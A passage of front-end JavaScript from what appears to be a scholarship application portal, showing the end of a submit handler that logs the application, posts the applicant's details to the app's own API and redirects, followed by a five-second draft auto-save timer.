          icon: '🆕',
          text: `New application received from <strong>${newCard.title}</strong> for <strong>${scholarship.title}</strong>`,
          time: 'Just now'
        });
        localStorage.setItem('admin_activity_log', JSON.stringify(existingLogs));

        window.dispatchEvent(new Event('storage'));
        try {
          const bc = new BroadcastChannel('bingo_platform_sync');
          bc.postMessage({ type: 'DATA_UPDATED', timestamp: Date.now() });
          bc.close();
        } catch (e) { }
      } catch (e) {
        console.warn('Could not update admin local storage:', e);
      }

      try {
        const appPayload = {
          scholarshipId: scholarship.id,
          statement: fd.get('statement'),
          personalDetails: JSON.stringify({
            studentId: fd.get('studentId'),
            fullName: fd.get('fullName'),
            email: fd.get('email'),
            phone: fd.get('phone'),
            country: fd.get('country')
          }),
          academicInfo: JSON.stringify({
            institution: fd.get('institution'),
            degree: fd.get('degree'),
            gpa: fd.get('gpa'),
            gradYear: fd.get('gradYear')
          })
        };

        await api.post('/applications', appPayload);
      } catch (err) {
        console.warn('API error, saving demo application locally:', err);
      }

      localStorage.removeItem(`app_draft_${scholarship.id}`);
      showToast('Congratulations! Your scholarship application has been officially submitted!', 'success');
      setTimeout(() => {
        window.location.hash = '/portal';
      }, 1500);
    });

    // Auto-save interval
    setInterval(() => {
      saveDraftData();
      const saveIndicator = document.getElementById('save-indicator');
      if (saveIndicator) {
        saveIndicator.textContent = 'Draft auto-saved ✓';
        setTimeout(() => {
          if (saveIndicator) saveIndicator.textContent = 'Auto-save active (every 5s) ✓';
        }, 1500);
      }
    }, 5000);
  }
};
